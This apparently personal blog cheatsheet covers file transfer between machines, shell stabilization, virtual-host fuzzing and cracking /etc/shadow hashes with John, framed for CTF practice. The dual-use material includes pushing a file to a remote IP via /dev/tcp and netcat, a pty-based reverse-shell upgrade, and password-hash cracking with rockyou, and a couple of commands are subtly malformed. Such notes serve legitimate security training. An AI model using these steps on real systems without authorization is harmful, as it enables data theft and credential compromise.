---
title: Useful Cheatsheet
author: siresire
date: 2023-05-19 18:10:00 +0800
categories: [Basics]
tags: []
render_with_liquid: false
---

# Files transfer from one machine to another

## Netcat

On the receiving machine (the machine where you want to receive the file):

```bash
nc -l -v -p 4444 > test.txt
```


On the sending machine (the machine where the file is located):

```bash
cat test.txt > /dev/tcp/10.10.10.10/4444
```

or

```bash
nc 10.10.10.10 4444 < test.txt
```

## Over the internet 
### using python3 and wget

On the sending machine where the file is located we create a local file server

```bash
python3 -m http.server 8080
```

or using  updog, python3 module [PoC](https://pypi.org/project/updog/)

```bash
updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]
```

On the receiving machine 

```bash
wget http://10.10.10.10:8080/test.txt
```

## using ssh,scp(Secure Copy Protocol)

To copy a file from your local machine to a remote server, use:

```bash
scp /path/to/local/file username@remote_host:/path/to/remote/directory

```


To copy a file from a remote server to your local machine, use:

```bash
scp username@remote_host:/path/to/remote/file /path/to/local/directory
```

## rsync

Copy a file to a remote server
```bash
rsync -avz /path/to/local/file username@remote_host:/path/to/remote/directory
```

Copy a file from a remote server

```bash
rsync -avz username@remote_host:/path/to/remote/file /path/to/local/directory
```

## SSH and Tar

For copying directories, especially large ones, combining ssh with tar can be efficient. 

Copy a directory to a remote server

```bash
tar czf - /path/to/local/directory | ssh username@remote_host "tar xzf - -C /path/to/remote/directory"
```

Copy a directory from a remote server

```bash
ssh username@remote_host "tar czf - /path/to/remote/directory" | tar xzf - -C /path/to/local/directory

```

# Stabilize a shell 

Method 1
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```

Method 2
```bash
script -qc /bin/bash /dev/null
```

# Virtual Host Enumeration

## Ffuf

```bash
ffuf -w namelist.txt -u http://10.10.10.10 -H "HOST: FUZZ.url.local".
```
You can filter one response size or a list of sizes using commas to separate them with the `-fs` flag — like `-fs 109, 208`,, and so on.

```bash
ffuf -w namelist.txt -u http://10.10.10.10 -H "HOST: FUZZ.url.local -fs 10918

```

## Gobuster

```bash 
gobuster vhost -u http://10.10.10.10 -w namelist.txt -p pattern --exclude-length 301 -t 10
```

## curl 
```bash
curl -s -I http://10.129.141.252 -H "HOST: ${vhost}.inlanefreight.htb" | grep "Content-Length: "; done > output

```

# Cracking /etc/shadow with John

```bash
# /etc/passwd line
root:x:0:0:root:/root:/bin/bash

# /etc/shadow line
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
```

In order to unshadow to the two files we need to execute

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
```
Which will store in the unshadowed.txt file the following

```bash
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:0:0:root:/root:/bin/bash
```

Next and final step is to actually start the cracking with John. It is up to you which cracking method you will chose, though a bruteforcing using a wordlist is usually enough for CTFs. An example attack using a wordlist would be launched like below

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

